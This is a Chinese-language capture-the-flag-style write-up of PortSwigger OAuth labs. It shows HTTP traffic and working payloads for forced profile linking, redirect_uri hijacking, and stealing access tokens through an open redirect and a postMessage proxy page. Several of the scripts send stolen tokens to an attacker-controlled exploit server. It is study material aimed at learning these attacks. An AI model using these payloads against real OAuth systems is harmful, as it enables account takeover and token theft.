

## 利用 OAuth 认证漏洞

### OAuth 客户端应用程序中的漏洞

#### 隐式授权类型的错误实现

实验：通过 OAuth 隐式流程绕过身份验证
https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow
见 利用 OAuth 认证漏洞


#### 有缺陷的 CSRF 保护

实验：强制 OAuth 资料链接
https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking

0.  使用oauth关联功能
    GET /auth?client_id=i0xty24ivjpp1aydi8ptd&redirect_uri=https://0ab4006203a69a7d80e0260d000100de.web-security-academy.net/oauth-linking&response_type=code&scope=openid%20profile%20email HTTP/1.1
    Host: oauth-0af7000b03fc9a2380d7245702f60034.oauth-server.net

    响应为oauth登录页面与登录cookie

    HTTP/2 302 Found
    X-Powered-By: Express
    Set-Cookie: _interaction=_sENkBdwvyjQX01j-RGGz; path=/interaction/_sENkBdwvyjQX01j-RGGz; expires=Tue, 11 Nov 2025 05:20:30 GMT; samesite=lax; secure; httponly
    Set-Cookie: _interaction_resume=_sENkBdwvyjQX01j-RGGz; path=/auth/_sENkBdwvyjQX01j-RGGz; expires=Tue, 11 Nov 2025 05:20:30 GMT; samesite=lax; secure; httponly
    Location: /interaction/_sENkBdwvyjQX01j-RGGz

1.  在登录页面，使用oauth登录

    POST /interaction/_sENkBdwvyjQX01j-RGGz/login HTTP/2
    Host: oauth-0af7000b03fc9a2380d7245702f60034.oauth-server.net
    Cookie: _interaction=_sENkBdwvyjQX01j-RGGz
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 37

    username=peter.wiener&password=hotdog

    响应为登录成功的重定向
    
    HTTP/2 302 Found
    X-Powered-By: Express
    Location: https://oauth-0af7000b03fc9a2380d7245702f60034.oauth-server.net/auth/_sENkBdwvyjQX01j-RGGz

2.  请求登录成功的页面

    GET /auth/_sENkBdwvyjQX01j-RGGz HTTP/2
    Host: oauth-0af7000b03fc9a2380d7245702f60034.oauth-server.net
    Cookie: _interaction_resume=_sENkBdwvyjQX01j-RGGz

    响应确认授权的重定向并得到登录cookie

    HTTP/2 302 Found
    X-Powered-By: Express
    Set-Cookie: _interaction=_sENkBdwvyjQX01j-RGGz; path=/interaction/_sENkBdwvyjQX01j-RGGz; expires=Tue, 11 Nov 2025 05:20:41 GMT; samesite=lax; secure; httponly
    Set-Cookie: _interaction_resume=_sENkBdwvyjQX01j-RGGz; path=/auth/_sENkBdwvyjQX01j-RGGz; expires=Tue, 11 Nov 2025 05:20:41 GMT; samesite=lax; secure; httponly
    Set-Cookie: _session=8TiBn7rDWUpl0jIzN8DiK; path=/; expires=Tue, 25 Nov 2025 05:10:41 GMT; samesite=none; secure; httponly
    Set-Cookie: _session.legacy=8TiBn7rDWUpl0jIzN8DiK; path=/; expires=Tue, 25 Nov 2025 05:10:41 GMT; secure; httponly
    Location: /interaction/_sENkBdwvyjQX01j-RGGz

3.  请求确认授权页面，并发送登录cookie

    GET /interaction/_sENkBdwvyjQX01j-RGGz HTTP/2
    Host: oauth-0af7000b03fc9a2380d7245702f60034.oauth-server.net
    Cookie: _interaction=_sENkBdwvyjQX01j-RGGz; _session=8TiBn7rDWUpl0jIzN8DiK; _session.legacy=8TiBn7rDWUpl0jIzN8DiK

    响应授权页面，包含不含令牌，仅使用之前url字符串的post表单

    HTTP/2 200 OK
    X-Powered-By: Express
    Content-Type: text/html; charset=utf-8
    ```html
    <form autocomplete="off" action="/interaction/_sENkBdwvyjQX01j-RGGz/confirm" method="post">
        <button autofocus type="submit" class="login login-submit">Continue</button>
    </form>
    ```

4.  发送确认表单，并发送登录cookie
    POST /interaction/_sENkBdwvyjQX01j-RGGz/confirm HTTP/2
    Host: oauth-0af7000b03fc9a2380d7245702f60034.oauth-server.net
    Cookie: _interaction=_sENkBdwvyjQX01j-RGGz; _session=8TiBn7rDWUpl0jIzN8DiK; _session.legacy=8TiBn7rDWUpl0jIzN8DiK

    重定向到与之前登录成功页面相同url

    HTTP/2 302 Found
    X-Powered-By: Express
    Location: https://oauth-0af7000b03fc9a2380d7245702f60034.oauth-server.net/auth/_sENkBdwvyjQX01j-RGGz


5.  访问与之前登录成功页面相同url，此时发送登录cookie
    GET /auth/_sENkBdwvyjQX01j-RGGz HTTP/2
    Host: oauth-0af7000b03fc9a2380d7245702f60034.oauth-server.net
    Cookie: _interaction_resume=_sENkBdwvyjQX01j-RGGz; _session=8TiBn7rDWUpl0jIzN8DiK; _session.legacy=8TiBn7rDWUpl0jIzN8DiK

    响应似乎为应用程序与oauth账户的链接页面，以链接及令牌

    HTTP/2 302 Found
    X-Powered-By: Express
    Set-Cookie: _interaction_resume=; path=/auth/_sENkBdwvyjQX01j-RGGz; expires=Thu, 01 Jan 1970 00:00:00 GMT; samesite=lax; secure; httponly
    Set-Cookie: _session=DFL5-Tld9XI0ZMVAUhY61; path=/; expires=Tue, 25 Nov 2025 05:10:43 GMT; samesite=none; secure; httponly
    Set-Cookie: _session.legacy=DFL5-Tld9XI0ZMVAUhY61; path=/; expires=Tue, 25 Nov 2025 05:10:43 GMT; secure; httponly
    Location: https://0ab4006203a69a7d80e0260d000100de.web-security-academy.net/oauth-linking?code=44EtInaU99EGDM5U_tlPK34AkxkWn8S94cV3h3x9VBs

6.  访问账户链接页面，使用url令牌与应用程序会话令牌
    GET /oauth-linking?code=44EtInaU99EGDM5U_tlPK34AkxkWn8S94cV3h3x9VBs HTTP/2
    Host: 0ab4006203a69a7d80e0260d000100de.web-security-academy.net
    Cookie: session=kjR0cNz81sHwkn52lxxzzcIbT5nUcSjW

    此时完成账户链接

    HTTP/2 200 OK


操作：请求初始页面，填写表单并发送，确认授权。
其余内容均为重定向

> 前往 Burp 代理，转发任何请求，直到拦截到 GET /oauth-linking?code=[...] 的请求。右键点击此请求并选择"复制 URL"。
> 放下请求。这很重要，以确保代码不被使用，因此保持有效。

示例解决方案拦截并使用最后一步服务器返回的未使用的 linking code
GET /oauth-linking?code=uu95GJdWVCJK8-cbKpxz1qW_xFZBBn3yJQwGI85rQwf HTTP/2
构建控制页面，并登出账户
<img src="https://0a7a00fa04e467f0805e7ba200db004d.web-security-academy.net/oauth-linking?code=uu95GJdWVCJK8-cbKpxz1qW_xFZBBn3yJQwGI85rQwf">
发送页面，在目标用户访问后使用oauth账户登录

此处区分使用oauth的登录code与链接code
此处的应用程序会话cookie使用
Secure; HttpOnly; SameSite=None
可跨域

#### 泄露授权码和访问令牌
实验：通过 redirect_uri 进行 OAuth 账户劫持
https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri

在登录后请求授权页面时
GET /auth?client_id=inenxxjvch2kebwl2fjul&redirect_uri=https://0ab700aa04584c56803e179d0098009a.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/2
Host: oauth-0ab200e204044c4f80b4159b0287001f.oauth-server.net
Cookie: _session=xVjzOkMgZN7c7hso-FuOE; _session.legacy=xVjzOkMgZN7c7hso-FuOE

服务器响应的不是验证过程页面，而是最终的通过验证后使用 redirect_uri 定义的 callback 端点重定向，并包含令牌
HTTP/2 302 Found
X-Powered-By: Express
Location: https://0ab700aa04584c56803e179d0098009a.web-security-academy.net/oauth-callback?code=DcklnMM-ra8H_GuUcAGVw6maIN48tUoC3vO1wK9rzJl
Set-Cookie: _session=xVjzOkMgZN7c7hso-FuOE; path=/; expires=Tue, 25 Nov 2025 08:58:56 GMT; samesite=none; secure; httponly
Set-Cookie: _session.legacy=xVjzOkMgZN7c7hso-FuOE; path=/; expires=Tue, 25 Nov 2025 08:58:56 GMT; secure; httponly
Content-Length: 145

Redirecting to https://0ab700aa04584c56803e179d0098009a.web-security-academy.net/oauth-callback?code=DcklnMM-ra8H_GuUcAGVw6maIN48tUoC3vO1wK9rzJl.


那么修改请求授权页面的 redirect_uri 到控制服务器
/auth?client_id=inenxxjvch2kebwl2fjul&redirect_uri=https://exploit-0ac600cf04444ca880a516a7013a0075.exploit-server.net/exploit?&response_type=code&scope=openid%20profile%20email

登出账户
设置控制页面为
<script>
    location.href = 'https://oauth-0ab200e204044c4f80b4159b0287001f.oauth-server.net/auth?client_id=inenxxjvch2kebwl2fjul&redirect_uri=https://exploit-0ac600cf04444ca880a516a7013a0075.exploit-server.net/my-callback?&response_type=code&scope=openid%20profile%20email'
</script>
发送到目标用户后，在日志中找到令牌

复制令牌到应用程序端点后作为目标用户登录
/oauth-callback?code=



#### 通过代理页面窃取代码和访问令牌
实验：通过开放重定向窃取 OAuth 访问令牌
https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect

在下一页功能中发现重定向
GET /post/next?path=/post?postId=2 HTTP/2
Host: 0a8e00ac03db98a6804e2649009500dc.web-security-academy.net

HTTP/2 302 Found
Location: https://post?postId=2

修改为 
/post/next?path=https://exploit-0a77009503269824809c2570015500c7.exploit-server.net
实现开放重定向
HTTP/2 302 Found
Location: https://exploit-0a77009503269824809c2570015500c7.exploit-server.net

使用上一个lab相同的 redirect_uri 漏洞，使用开放重定向间接到控制服务器
redirect_uri=https://0a8e00ac03db98a6804e2649009500dc.web-security-academy.net/oauth-callback

若去除原url的 oauth-callback 路径，将返回不匹配，使用路径遍历控制url到开放重定向位置
redirect_uri=https://0a8e00ac03db98a6804e2649009500dc.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a77009503269824809c2570015500c7.exploit-server.net&response_type=token&nonce=-547633332&scope=openid%20profile%20email

设置控制页面为
```html
<script>
    location.href = 'https://oauth-0a85009303e3984b80e824b102120065.oauth-server.net/auth?client_id=x2z23dpl5e443k1nc4m17&redirect_uri=https://0a8e00ac03db98a6804e2649009500dc.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a77009503269824809c2570015500c7.exploit-server.net&response_type=token&nonce=-547633332&scope=openid%20profile%20email'
</script>
```
然而，对于隐式授权使用#片段传递的参数，再次重定向将丢失这些参数
如何提取 # 片段？

**浏览器不向服务器发送#片段，即代理服务器中看不到#的发送。然而#片段即使跨域服务器级重定向，仍然保留在客户端**

应用程序脚本
GET /oauth-callback HTTP/2
响应
```html
<script>
const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
const token = urlSearchParams.get('access_token');
fetch('https://oauth-0a85009303e3984b80e824b102120065.oauth-server.net/me', {
    method: 'GET',
    headers: {
        'Authorization': 'Bearer ' + token,
        'Content-Type': 'application/json'
    }
})
.then(r => r.json())
.then(j => 
    fetch('/authenticate', {
        method: 'POST',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            email: j.email,
            username: j.sub,
            token: token
        })
    }).then(r => document.location = '/'))
</script>
```

对此脚本进行修改，
如无参数则跳转，如有参数则获取后发送
```html
<script>
const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
const token = urlSearchParams.get('access_token');

if(token === null){
    location.href = 'https://oauth-0a85009303e3984b80e824b102120065.oauth-server.net/auth?client_id=x2z23dpl5e443k1nc4m17&redirect_uri=https://0a8e00ac03db98a6804e2649009500dc.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a77009503269824809c2570015500c7.exploit-server.net/exploit&response_type=token&nonce=-547633332&scope=openid%20profile%20email';
}else{  
    fetch('https://exploit-0a77009503269824809c2570015500c7.exploit-server.net/?' + urlSearchParams);
}

</script>
```

发送到目标用户后log中得到
/?access_token=Ewb2hZJvvYGxBF162fQSricL3fCeG10V_BkYsDrmvBd&expires_in=3600&token_type=Bearer&scope=openid+profile+email
/?access_token=Ewb2hZJvvYGxBF162fQSricL3fCeG10V_BkYsDrmvBd&expires_in=3600&token_type=Bearer&scope=openid profile email

将此内容放到原脚本的#片段中
/oauth-callback#access_token=Ewb2hZJvvYGxBF162fQSricL3fCeG10V_BkYsDrmvBd&expires_in=3600&token_type=Bearer&scope=openid+profile+email
查看拦截代理服务器的记录
GET /me HTTP/2
Authorization: Bearer Ewb2hZJvvYGxBF162fQSricL3fCeG10V_BkYsDrmvBd
响应为
```json
{"sub":"administrator","apikey":"p9mQlJyAAnqvKT4cXcgjCS26fl7lezvk","name":"Administrator","email":"administrator@normal-user.net","email_verified":true}
```

或根据原脚本自定义脚本，但此处可直接使用

示例解决方案在保存#片段时使用相对url更简洁，仅获取apikey后更改 /me 的头部



实验：通过代理页面窃取 OAuth 访问令牌
https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page

此处未设置禁止跨域框架，且应用程序使用message传递信息。
存在 redirect_uri 参数的 白名单前缀路径遍历重定向

详情页加载脚本与框架，此lab的评论编辑区为子框架而不是表单
GET /post?postId=1 HTTP/2
```html
<script>
    window.addEventListener('message', function(e) {
        if (e.data.type === 'oncomment') {
            e.data.content['csrf'] = 'lXaHja8QjT2H7LTAHncOosBBfi6NWuV5';
            const body = decodeURIComponent(new URLSearchParams(e.data.content).toString());
            fetch("/post/comment",
                {
                    method: "POST",
                    body: body
                }
            ).then(r => window.location.reload());
        }
    }, false)
</script>

<iframe onload='this.height = this.contentWindow.document.body.scrollHeight + "px"' width=100% frameBorder=0 src='/post/comment/comment-form#postId=1'></iframe>
```
在框架message的data中，
若type为 'oncomment'
则data的查询字符串中的内容作为字符串提交到评论功能中
可作为信息保存

框架的src中存在反射输入，但符号被转义
将父框架url的?查询字符串转为#片段，而原#片段丢失

框架加载的src为
GET /post/comment/comment-form HTTP/2
响应为
```html
<script>
    parent.postMessage({type: 'onload', data: window.location.href}, '*')
    function submitForm(form, ev) {
        ev.preventDefault();
        const formData = new FormData(document.getElementById("comment-form"));
        const hashParams = new URLSearchParams(window.location.hash.substr(1));
        const o = {};
        formData.forEach((v, k) => o[k] = v);
        hashParams.forEach((v, k) => o[k] = v);
        parent.postMessage({type: 'oncomment', content: o}, '*');
        form.reset();
    }
</script>
```
第一种作用：
无条件传递message到父框架，此时type为 onload，内容为整个url

第二种作用：
当提交表单被触发时，阻止默认操作
获取表单内容与url的#片段，并以message的type为oncomment而传递到父框架
只有 type为oncomment 在父框架中作为评论保存



此处使用第一种，在控制页面设置子框架，在子框架中进行 redirect_uri 重定向。
在父框架中进行message接收，参考应用程序脚本
转为url对象，使用hash方法获取#片段
```html
<script>
    window.addEventListener('message', function(e) {
        console.log('have message');
        if (e.data.type === 'onload') {
            console.log('message type is onload');
            const body = decodeURIComponent(new URL(e.data.data).hash.substring(1));
            console.log(body);
            fetch('/'+body);
        }
    }, false)
</script>
<iframe src="https://oauth-0ac100bc04bf7fce80c6065602c1002c.oauth-server.net/auth?client_id=wh6hgk6zghpc9yhztji5b&redirect_uri=https://0ad4009604a17ff580040824001900b5.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=299920183&scope=openid%20profile%20email"></iframe>
```

火狐无法在框架请求时发送cookie失败，chrome可发送成功
在火狐设置中，默认开启拦截跨站cookie，在自定义关闭后则成功